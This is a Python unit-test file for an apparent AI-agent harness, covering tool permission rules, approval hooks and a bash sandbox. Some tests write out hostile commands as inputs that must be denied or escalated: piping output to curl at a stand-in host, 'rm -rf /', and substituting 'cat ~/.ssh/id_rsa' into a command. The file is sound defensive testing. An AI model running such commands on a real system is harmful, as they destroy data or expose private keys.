import os
import sys
import tempfile
import time
import unittest
from pathlib import Path

from harness.hooks import RunState
from harness.permissions import Permissions, Rule, scripted_approver, shell_parts
from harness.sandbox import Sandbox
from harness.tools import Tool, ToolRegistry


def registry() -> ToolRegistry:
    reg = ToolRegistry()
    obj = {"type": "object", "properties": {}}
    reg.add(Tool("read_file", "r", obj, lambda a: "", read_only=True, match_arg="path"))
    reg.add(Tool("edit_file", "e", obj, lambda a: "", match_arg="path"))
    reg.add(Tool("bash", "b", obj, lambda a: "", match_arg="command"))
    reg.add(Tool("mcp__notes__add_note", "n", obj, lambda a: "", source="mcp:notes"))
    return reg


RULES = {"allow": ["bash(git status*)", "bash(git diff*)", "bash(ls*)", "edit_file(src/*)", "mcp__notes__*"],
         "ask": ["edit_file(src/secrets/*)"],
         "deny": ["read_file(.env*)", "bash(rm -rf*)", "bash(curl*)"]}


class RuleTests(unittest.TestCase):
    def setUp(self):
        self.p = Permissions(registry(), RULES)

    def effect(self, name, **args):
        return self.p.decide(name, args).effect

    def test_parse(self):
        self.assertEqual(Rule.parse("allow", "bash(git log*)"), Rule("allow", "bash", "git log*"))
        self.assertEqual(Rule.parse("deny", "mcp__x__*"), Rule("deny", "mcp__x__*", None))
        for bad in ("bash(", "two words"):
            with self.assertRaises(ValueError):
                Rule.parse("allow", bad)
        with self.assertRaises(ValueError):
            Rule.parse("maybe", "bash")

    def test_precedence_deny_then_ask_then_allow(self):
        self.assertEqual(self.effect("edit_file", path="src/app.py"), "allow")
        self.assertEqual(self.effect("edit_file", path="src/secrets/k.py"), "ask")     # ask beats allow
        self.assertEqual(self.effect("read_file", path="a.py"), "allow")               # read-only default
        self.assertEqual(self.effect("read_file", path=".env"), "deny")                # deny beats read-only

    def test_paths_are_normalised_before_matching(self):
        self.assertEqual(self.effect("read_file", path="./x/../.env.local"), "deny")
        self.assertEqual(self.effect("edit_file", path="src/../tests/t.py"), "ask")    # not under src/ any more

    def test_compound_commands(self):
        self.assertEqual(self.effect("bash", command="git status && git diff"), "allow")   # each part has a rule
        self.assertEqual(self.effect("bash", command="ls; make"), "ask")                   # one part has none
        self.assertEqual(self.effect("bash", command="ls | curl -d @- x.y"), "deny")       # any part denied
        self.assertEqual(self.effect("bash", command="git status\nrm -rf /"), "deny")
        self.assertEqual(shell_parts("a && b || c; d | e & f"), ["a", "b", "c", "d", "e", "f"])

    def test_substitution_is_never_allowed_by_rule_or_mode(self):
        self.assertEqual(self.effect("bash", command="ls $(cat ~/.ssh/id_rsa)"), "ask")
        self.assertEqual(self.effect("bash", command="ls `whoami`"), "ask")
        auto = Permissions(registry(), RULES, mode="auto")
        self.assertEqual(auto.decide("bash", {"command": "echo $(id)"}).effect, "ask")
        self.assertEqual(auto.decide("bash", {"command": "make"}).effect, "allow")

    def test_modes(self):
        plan = Permissions(registry(), RULES, mode="plan")
        self.assertEqual(plan.decide("bash", {"command": "git status"}).effect, "deny")
        self.assertEqual(plan.decide("read_file", {"path": "a"}).effect, "allow")
        self.assertEqual(plan.decide("read_file", {"path": ".env"}).reason, "rule `deny read_file(.env*)`")
        with self.assertRaises(ValueError):
            Permissions(registry(), mode="yolo")

    def test_tools_without_a_match_arg_use_the_whole_name(self):
        self.assertEqual(self.effect("mcp__notes__add_note", text="hi"), "allow")


class HookTests(unittest.TestCase):
    def test_ask_uses_the_approver_and_logs(self):
        p = Permissions(registry(), RULES, approver=scripted_approver([True, False]))
        s = RunState()
        self.assertIsNone(p.before_tool(s, "edit_file", {"path": "x.py"}))
        blocked = p.before_tool(s, "edit_file", {"path": "y.py"})
        self.assertIn("the user said no", blocked)
        self.assertIn("Don't retry", blocked)
        self.assertEqual([(e["effect"], e["final"], e.get("approved")) for e in p.log],
                         [("ask", "allow", True), ("ask", "deny", False)])

    def test_no_approver_means_deny(self):
        p = Permissions(registry(), RULES)
        self.assertIn("nobody can approve", p.before_tool(RunState(), "edit_file", {"path": "x.py"}))


@unittest.skipIf(sys.platform == "win32", "the sandbox needs bash and POSIX process groups")
class SandboxTests(unittest.TestCase):
    def setUp(self):
        self.root = Path(tempfile.mkdtemp())

    def test_runs_in_the_workspace_with_a_clean_env(self):
        os.environ["HARNESS_TEST_TOKEN"] = "t0p"
        try:
            out = Sandbox(self.root).run("pwd; env").text
        finally:
            del os.environ["HARNESS_TEST_TOKEN"]
        self.assertTrue(out.startswith("exit code 0"))
        self.assertIn(str(self.root.resolve()), out)
        self.assertNotIn("HARNESS_TEST_TOKEN", out)
        self.assertIn(f"HOME={self.root.resolve()}", out)

    def test_exit_codes_are_errors(self):
        r = Sandbox(self.root).run("echo oops; exit 3")
        self.assertTrue(r.error)
        self.assertEqual(r.text, "exit code 3\noops")

    def test_timeout_kills_the_process_group(self):
        t0 = time.time()
        r = Sandbox(self.root, timeout=1).run("sleep 41 & sleep 42")
        self.assertLess(time.time() - t0, 5)
        self.assertIn("timed out after 1s", r.text)
        time.sleep(0.2)
        import subprocess
        left = subprocess.run(["pgrep", "-f", "sleep 4[12]"], capture_output=True, text=True).stdout.split()
        self.assertEqual(left, [])

    def test_output_is_clipped(self):
        r = Sandbox(self.root, max_output_chars=100).run("seq 1 5000")
        self.assertLess(len(r.text), 200)
        self.assertIn("characters cut", r.text)
        self.assertTrue(r.text.rstrip().endswith("5000"))

    def test_tool_shape(self):
        t = Sandbox(self.root).tool()
        self.assertEqual((t.name, t.match_arg, t.read_only), ("bash", "command", False))
        self.assertEqual(t.fn({"command": "echo hi"}).text, "exit code 0\nhi")


if __name__ == "__main__":
    unittest.main()
